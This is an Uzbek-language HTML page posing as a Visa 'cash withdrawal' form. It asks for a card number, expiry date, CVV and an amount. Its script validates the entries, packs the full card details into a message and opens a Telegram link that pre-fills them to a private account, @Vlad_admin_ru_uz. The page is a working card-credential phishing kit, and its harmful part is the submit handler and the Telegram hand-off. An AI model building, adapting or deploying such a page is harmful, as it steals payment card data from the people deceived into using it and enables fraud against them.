<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Pul yechish ¬∑ Visa</title>
    <!-- Google Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
            position: relative;
            background-color: #0b1a2e; /* fallback */
        }

        /* yarim shaffof fon rasmi */
        body::before {
            content: "";
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('https://images.pexels.com/photos/4101143/pexels-photo-4101143.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            opacity: 0.5;  /* 50% shaffoflik */
            z-index: -1;
            pointer-events: none;
        }

        .card-form {
            width: 100%;
            max-width: 440px;
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            border-radius: 32px;
            padding: 28px 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25), 0 8px 16px rgba(0, 0, 0, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.4);
            transition: all 0.2s;
        }

        .card-form h2 {
            font-size: 28px;
            font-weight: 700;
            color: #0b1a2e;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .subhead {
            font-size: 15px;
            color: #2c3e50;
            margin-bottom: 28px;
            font-weight: 500;
            opacity: 0.85;
            border-left: 4px solid #1a73e8;
            padding-left: 14px;
            background: linear-gradient(90deg, rgba(26,115,232,0.05) 0%, rgba(255,255,255,0) 100%);
            border-radius: 0 8px 8px 0;
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-group label {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 14px;
            font-weight: 600;
            color: #1e2b3a;
            margin-bottom: 6px;
        }

        .input-group label i {
            font-size: 18px;
            color: #1a73e8;
        }

        .input-field {
            width: 100%;
            padding: 16px 18px;
            font-size: 16px;
            background: white;
            border: 1.5px solid #e2e8f0;
            border-radius: 20px;
            outline: none;
            transition: border 0.2s, box-shadow 0.2s;
            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
        }

        .input-field:focus {
            border-color: #1a73e8;
            box-shadow: 0 8px 18px -8px rgba(26,115,232,0.3);
        }

        .input-field.error {
            border-color: #d32f2f;
            background-color: #fff5f5;
        }

        .row-fields {
            display: flex;
            gap: 16px;
            flex-wrap: wrap;
        }

        .row-fields .input-group {
            flex: 1 1 0;
            min-width: 120px;
        }

        .hint-text {
            font-size: 12px;
            color: #5f6b7a;
            margin-top: 5px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .hint-text i {
            font-size: 14px;
            color: #1a73e8;
        }

        .amount-wrapper {
            position: relative;
        }

        .amount-wrapper::before {
            content: "so'm";
            position: absolute;
            right: 20px;
            top: 50%;
            transform: translateY(-50%);
            font-weight: 600;
            color: #1a73e8;
            background: #e9f0fd;
            padding: 4px 8px;
            border-radius: 30px;
            font-size: 14px;
            pointer-events: none;
        }

        .btn-submit {
            width: 100%;
            background: linear-gradient(145deg, #1a73e8, #0d47a1);
            color: white;
            font-weight: 700;
            font-size: 18px;
            padding: 18px 20px;
            border: none;
            border-radius: 30px;
            margin-top: 28px;
            cursor: pointer;
            box-shadow: 0 10px 20px -7px #0d47a1;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            border: 1px solid rgba(255,255,255,0.3);
        }

        .btn-submit:hover {
            background: linear-gradient(145deg, #0d47a1, #0a356b);
            transform: scale(1.02);
            box-shadow: 0 15px 25px -8px #0d2e5e;
        }

        .btn-submit:active {
            transform: scale(0.98);
        }

        .visa-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(26,115,232,0.12);
            padding: 6px 14px;
            border-radius: 40px;
            font-size: 13px;
            font-weight: 600;
            color: #0d47a1;
            margin-bottom: 16px;
            border: 1px dashed #1a73e8;
        }

        .visa-badge::before {
            content: "üí≥";
            margin-right: 6px;
            font-size: 16px;
        }

        footer {
            margin-top: 24px;
            text-align: center;
            font-size: 13px;
            color: #3a4a5c;
            opacity: 0.75;
            border-top: 1px solid rgba(0,0,0,0.1);
            padding-top: 16px;
        }

        /* kichik ekran uchun moslashuv */
        @media (max-width: 480px) {
            .card-form {
                padding: 22px 16px;
                border-radius: 28px;
            }

            .row-fields {
                gap: 12px;
            }

            .input-field {
                padding: 14px 16px;
                font-size: 15px;
            }

            .btn-submit {
                padding: 16px;
                font-size: 17px;
            }
        }

        /* simulyatsiya qilingan ikonkalar (inline svg emas, oddiy unicode) */
        .icon {
            font-size: 18px;
        }
    </style>
</head>
<body>

    <div class="card-form">
        <div class="visa-badge">faqat Visa kartalar uchun</div>
        <h2>üí∏ Pul yechish</h2>
        <div class="subhead">ma ºlumotlarni to ªldiring va tasdiqlang</div>

        <!-- Forma maydoni -->
        <form id="withdrawForm">
            <!-- Karta raqami -->
            <div class="input-group">
                <label><span class="icon">üí≥</span> Karta raqami (Visa)</label>
                <input type="text" id="cardNumber" class="input-field" placeholder="karta raqamini yozing" maxlength="19" inputmode="numeric" autocomplete="cc-number">
                <div class="hint-text"><span class="icon">üîí</span> faqat visa kartasi kiriting</div>
            </div>

            <!-- Amal qilish muddati va CCV yonma-yon -->
            <div class="row-fields">
                <div class="input-group">
                    <label><span class="icon">üìÖ</span> amal qilish muddati</label>
                    <input type="text" id="expiry" class="input-field" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
                </div>
                <div class="input-group">
                    <label><span class="icon">üîê</span> CCV</label>
                    <input type="text" id="ccv" class="input-field" placeholder="karta orqasida korsatilgan" maxlength="4" inputmode="numeric" autocomplete="off">
                </div>
            </div>

            <!-- Yechish summasi -->
            <div class="input-group">
                <label><span class="icon">üí∞</span> Yechmoqchi bo ªlgan summa</label>
                <div class="amount-wrapper">
                    <input type="text" id="amount" class="input-field" placeholder="25000" inputmode="numeric">
                </div>
                <div class="hint-text"><span class="icon">‚¨ÜÔ∏è</span> Minimal 25 000 so‚Äòm</div>
            </div>

            <!-- Yuborish tugmasi (telegramga yo‚Äònaltirish) -->
            <button type="submit" class="btn-submit" id="submitBtn">
                <span>üí∞ </span> Pul yechish
            </button>
        </form>

        <footer>
            ‚ö° so‚Äòrov to‚Äòg‚Äòridan-to‚Äòg‚Äòri Telegram orgali jo‚Äònatiladi
        </footer>
    </div>

    <script>
        (function() {
            const form = document.getElementById('withdrawForm');
            const cardInput = document.getElementById('cardNumber');
            const expiryInput = document.getElementById('expiry');
            const ccvInput = document.getElementById('ccv');
            const amountInput = document.getElementById('amount');

            // Telefon raqam formatiga o‚Äòxshab, karta raqamiga bo‚Äòshliq qo‚Äòyish (qulaylik uchun)
            cardInput.addEventListener('input', function(e) {
                let val = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');
                let parts = [];
                for (let i = 0; i < val.length; i += 4) {
                    parts.push(val.substr(i, 4));
                }
                if (parts.length) {
                    e.target.value = parts.join(' ');
                }
            });

            // expiry avtomatik slash qo‚Äòyish (MM/YY)
            expiryInput.addEventListener('input', function(e) {
                let val = e.target.value.replace(/\//g, '').replace(/[^0-9]/g, '');
                if (val.length >= 2) {
                    e.target.value = val.substr(0, 2) + '/' + val.substr(2, 2);
                } else {
                    e.target.value = val;
                }
            });

            // CCV faqat raqam
            ccvInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/[^0-9]/g, '').substr(0, 4);
            });

            // summa faqat raqam
            amountInput.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            });

            // Formani yuborish (submit)
            form.addEventListener('submit', function(e) {
                e.preventDefault();

                // 1. Barcha maydonlarni o‚Äòqib olish va tozalash
                let rawCard = cardInput.value.replace(/\s+/g, '');
                let expiry = expiryInput.value.trim();
                let ccv = ccvInput.value.trim();
                let amount = amountInput.value.trim();

                // 2. Validatsiya
                let errors = [];

                // Karta raqami: 16 raqam va Visa (4 bilan boshlanadi)
                if (!rawCard) {
                    errors.push('Karta raqamini kiriting');
                } else if (!/^\d{16}$/.test(rawCard)) {
                    errors.push('Karta raqami 16 xonali bo‚Äòlishi kerak');
                } else if (rawCard[0] !== '4') {
                    errors.push('Faqat Visa kartalar qabul qilinadi (raqam 4 bilan boshlanishi kerak)');
                }

                // Amal qilish muddati MM/YY
                if (!expiry) {
                    errors.push('Amal qilish muddatini kiriting');
                } else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
                    errors.push('Muddat formati MM/YY bo‚Äòlishi kerak (masalan 12/25)');
                } else {
                    // oddiy tekshiruv: oy 01-12
                    let month = parseInt(expiry.split('/')[0], 10);
                    if (month < 1 || month > 12) errors.push('Oy 1-12 oralig‚Äòida bo‚Äòlishi kerak');
                }

                // CCV 3 yoki 4 raqam
                if (!ccv) {
                    errors.push('CCV kodini kiriting');
                } else if (!/^\d{3,4}$/.test(ccv)) {
                    errors.push('CCV 3 yoki 4 raqamdan iborat bo‚Äòlishi kerak');
                }

                // Summa: minimal 25000, faqat son
                if (!amount) {
                    errors.push('Summani kiriting');
                } else {
                    let amountNum = parseInt(amount, 10);
                    if (isNaN(amountNum) || amountNum < 25000) {
                        errors.push('Minimal yechish miqdori 25 000 so‚Äòm');
                    }
                }

                // Agar xatoliklar bo‚Äòlsa, ularni ko‚Äòrsat
                if (errors.length > 0) {
                    alert('Xatoliklar:\n- ' + errors.join('\n- '));
                    // xatolik maydonlarini qizil qilish (oddiy)
                    [cardInput, expiryInput, ccvInput, amountInput].forEach(i => i.classList.remove('error'));
                    if (!rawCard || rawCard.length !== 16 || rawCard[0] !== '4') cardInput.classList.add('error');
                    if (!expiry || !/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) expiryInput.classList.add('error');
                    if (!ccv || !/^\d{3,4}$/.test(ccv)) ccvInput.classList.add('error');
                    if (!amount || parseInt(amount,10) < 25000) amountInput.classList.add('error');
                    return;
                }

                // Xatoliklar bo‚Äòlmasa, barcha error klasslarini olib tashlaymiz
                [cardInput, expiryInput, ccvInput, amountInput].forEach(i => i.classList.remove('error'));

                // 3. Telegram xabar matnini tuzish (barcha ma'lumotlar)
                const message = `men pul yechmoqchiman\n` +
                                `üí≥ Karta: ${rawCard.match(/.{1,4}/g).join(' ')}\n` +
                                `üìÖ Muddat: ${expiry}\n` +
                                `üîê CCV: ${ccv}\n` +
                                `üí∞ Summa: ${parseInt(amount, 10).toLocaleString()} so‚Äòm`;

                // 4. Telegram username @Vlad_admin_ru_uz ga to‚Äòg‚Äòridan-to‚Äòg‚Äòri xabar yuborish uchun link
                //    t.me/username?text=... ishlaydi (agar foydalanuvchi telegram web/mobil ochiq bo‚Äòlsa)
                const telegramUsername = 'Vlad_admin_ru_uz'; // @siz
                const encodedMessage = encodeURIComponent(message);
                const telegramUrl = `https://t.me/${telegramUsername}?text=${encodedMessage}`;

                // 5. Foydalanuvchini xabarnoma qilamiz va yangi oynada telegram havolasini ochamiz
                //    (agar mobil bo‚Äòlsa, telegram ilovasi ochiladi, aks holda telegram web)
                const confirmSend = confirm(`Quyidagi ma ºlumotlar telegram orqali Bank transfer ga yuboriladi:\n\n${message}\n\n"OK" ni bosing va Telegram orqali yuboring.`);
                if (confirmSend) {
                    // Yangi oynada yoki shu oynada ochish (target="_blank" qilish uchun)
                    window.open(telegramUrl, '_blank');
                }

                // Ixtiyoriy: formani tozalash (agar kerak bo‚Äòlsa)
                // cardInput.value = '';  // izoh: ma'lumotlar o‚Äòchirilsinmi? hozircha tozalamaymiz
            });

            // Yana bir tekshirish: agar foydalanuvchi karta raqamini kiritayotganda visa emasligini sezish
            cardInput.addEventListener('blur', function() {
                let val = this.value.replace(/\s/g, '');
                if (val.length > 0 && val[0] !== '4') {
                    // ogohlantirish, lekin error klassini qo‚Äòyish
                    cardInput.classList.add('error');
                } else {
                    cardInput.classList.remove('error');
                }
            });

        })();
    </script>

    <!-- Izoh: rasm Pexels bepul (Kara Eads, litsenziya Pexels) ‚Äì bank kartalari mavzusida -->
    <!-- @Vlad_admin_ru_uz ga yuborish uchun t.me/username?text=... dan foydalanilgan -->
</body>
</html>
